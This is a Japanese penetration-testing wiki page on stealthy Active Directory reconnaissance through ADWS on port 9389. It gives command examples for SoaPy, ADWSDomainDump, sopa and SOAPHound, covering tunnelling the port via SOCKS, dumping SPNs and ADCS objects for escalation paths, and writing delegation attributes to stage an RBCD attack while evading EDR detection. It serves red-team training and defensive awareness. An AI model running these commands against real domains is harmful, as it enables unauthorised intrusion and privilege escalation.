# Active Directory Web Services (ADWS) 列挙 & ステルス収集

{{#include ../../banners/hacktricks-training.md}}

## ADWSとは？

Active Directory Web Services (ADWS) は、**Windows Server 2008 R2 以降のすべての Domain Controller でデフォルトで有効化されており**、TCP **9389** でリッスンします。名前に反して、**HTTP は関与しません**。代わりに、このサービスは独自の .NET フレーミングプロトコルのスタックを通じて LDAP 風のデータを公開します：

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

これらのトラフィックがバイナリの SOAP フレーム内にカプセル化され、一般的でないポートを使って流れるため、**ADWS 経由の列挙は従来の LDAP/389 & 636 トラフィックに比べて検査、フィルタリング、シグネチャ検出される可能性が大幅に低くなります**。オペレーターにとっては次のことを意味します：

* よりステルスな偵察 — Blue teams はしばしば LDAP クエリに注力します。
* 非Windowsホスト（Linux, macOS）から、SOCKS プロキシを介して 9389/TCP をトンネリングすることで収集可能。
* LDAP と同様のデータ（users, groups, ACLs, schema など）を取得でき、**書き込み**も可能（例: RBCD のための `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS とのやり取りは WS-Enumeration 上で実装されています：各クエリは LDAP フィルタ／属性を定義する `Enumerate` メッセージで始まり、`EnumerationContext` GUID を返します。その後、サーバが定義した結果ウィンドウまでをストリーミングする 1 回以上の `Pull` メッセージが続きます。コンテキストは約 30 分で期限切れになるため、ツールは結果をページングするかフィルタを分割（CN ごとのプレフィックスクエリ等）して状態を失わないようにする必要があります。セキュリティディスクリプタを要求する場合は、SACL を省略するために `LDAP_SERVER_SD_FLAGS_OID` コントロールを指定してください。そうしないと ADWS は SOAP レスポンスから `nTSecurityDescriptor` 属性を単純に削除します。

> NOTE: ADWS は多くの RSAT GUI/PowerShell ツールでも使用されているため、トラフィックが正当な管理者アクティビティと混ざる可能性があります。

## SoaPy – ネイティブ Python クライアント

[SoaPy](https://github.com/logangoins/soapy) は **純粋な Python で ADWS プロトコルスタックを完全再実装したもの** です。NBFX/NBFSE/NNS/NMF フレームをバイト単位で構築し、.NET ランタイムに触れることなく Unix 系システムから収集を可能にします。

### 主な機能

* **SOCKS 経由のプロキシ**をサポート（C2 インプラントから有用）。
* LDAP と同一の詳細な検索フィルタ（`-q '(objectClass=user)'`）を提供。
* オプションの **書き込み** 操作（`--set` / `--delete`）。
* BloodHound に直接取り込める **BOFHound 出力モード**。
* 人間が読みやすくするための `--parse` フラグ（タイムスタンプや `userAccountControl` の整形）。

### ターゲット収集フラグ & 書き込み操作

SoaPy には ADWS 上で最も一般的な LDAP ハンティングタスクを再現するキュレートされたスイッチが含まれます：`--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`、およびカスタム取得用の生の `--query` / `--filter`。これらは `--rbcd <source>`（`msDs-AllowedToActOnBehalfOfOtherIdentity` を設定）、`--spn <service/cn>`（ターゲット化した Kerberoasting 用の SPN ステージング）、`--asrep`（`userAccountControl` の `DONT_REQ_PREAUTH` を反転）などの書き込みプリミティブと組み合わせて使えます。

例：`samAccountName` と `servicePrincipalName` のみを返すターゲット化された SPN 検索：
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
同じホスト/認証情報を使用して発見を即座に武器化します: `--rbcds` で RBCD-capable オブジェクトをダンプし、続けて `--rbcd 'WEBSRV01$' --account 'FILE01$'` を適用して Resource-Based Constrained Delegation chain をステージします（完全な悪用パスは [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照）。

### インストール（オペレーターホスト）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump を ADWS 経由で (Linux/Windows)

* `ldapdomaindump` のフォークで、LDAP クエリを TCP/9389 の ADWS コールに置き換え、LDAP シグネチャによる検出を低減します。
* `--force` が指定されていない限り、最初にポート 9389 への到達性チェックを行います（ポートスキャンがノイジーまたはフィルタされている場合はプローブをスキップ）。
* Microsoft Defender for Endpoint と CrowdStrike Falcon に対してテスト済みで、README にバイパス成功の記載があります。

### インストール
```bash
pipx install .
```
### 使用方法
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型的な出力は、9389 の到達性チェック、ADWS bind、および dump start/finish をログに記録します:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is a .NET collector that keeps all LDAP interactions inside ADWS and emits BloodHound v4-compatible JSON. It builds a complete cache of `objectSid`, `objectGUID`, `distinguishedName` and `objectClass` once (`--buildcache`), then re-uses it for high-volume `--bhdump`, `--certdump` (ADCS), or `--dnsdump` (AD-integrated DNS) passes so only ~35 critical attributes ever leave the DC. AutoSplit (`--autosplit --threshold <N>`) automatically shards queries by CN prefix to stay under the 30-minute EnumerationContext timeout in large forests.

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
エクスポートしたJSONは直接SharpHound/BloodHoundワークフローに流し込めます—下流のグラフ化のアイデアについては[BloodHound methodology](bloodhound.md)を参照してください。AutoSplitによりSOAPHoundは数百万オブジェクト規模のフォレストでも耐性を持ち、クエリ数をADExplorerスタイルのスナップショットより低く抑えます。

## ステルスAD収集ワークフロー

以下のワークフローは、ADWS経由で**domain & ADCS objects**を列挙し、それらをBloodHound JSONに変換してcertificate-based attack pathsを探索する方法を、すべてLinuxから実行する流れで示します:

1. **Tunnel 9389/TCP** をターゲットネットワークから自分の環境へ張る（例: Chisel、Meterpreter、SSH dynamic port-forward 等）。環境変数に `export HTTPS_PROXY=socks5://127.0.0.1:1080` を設定するか、SoaPyの `--proxyHost/--proxyPort` を使用してください。

2. **ルートドメインオブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC から ADCS 関連のオブジェクトを収集する:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound に変換する:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIPを BloodHound GUI にアップロード**し、`MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` のような cypher クエリを実行して、証明書の昇格経路（ESC1、ESC8 など）を明らかにします。

### `msDs-AllowedToActOnBehalfOfOtherIdentity` の書き込み (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
これを `s4u2proxy`/`Rubeus /getticket` と組み合わせると、完全な **Resource-Based Constrained Delegation** チェーンになります（詳細は [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) を参照）。

## ツール概要

| 目的 | ツール | 備考 |
|---------|------|-------|
| ADWS 列挙 | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、読み書き |
| 大量の ADWS ダンプ | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、cache-first、BH/ADCS/DNS モード |
| BloodHound 取り込み | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch ログを変換 |
| 証明書の侵害 | [Certipy](https://github.com/ly4k/Certipy) | 同じ SOCKS を経由してプロキシ可能 |
| ADWS 列挙とオブジェクト変更 | [sopa](https://github.com/Macmod/sopa) | 既知の ADWS エンドポイントとやり取りする汎用クライアント - 列挙、オブジェクト作成、属性変更、パスワード変更を許可 |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
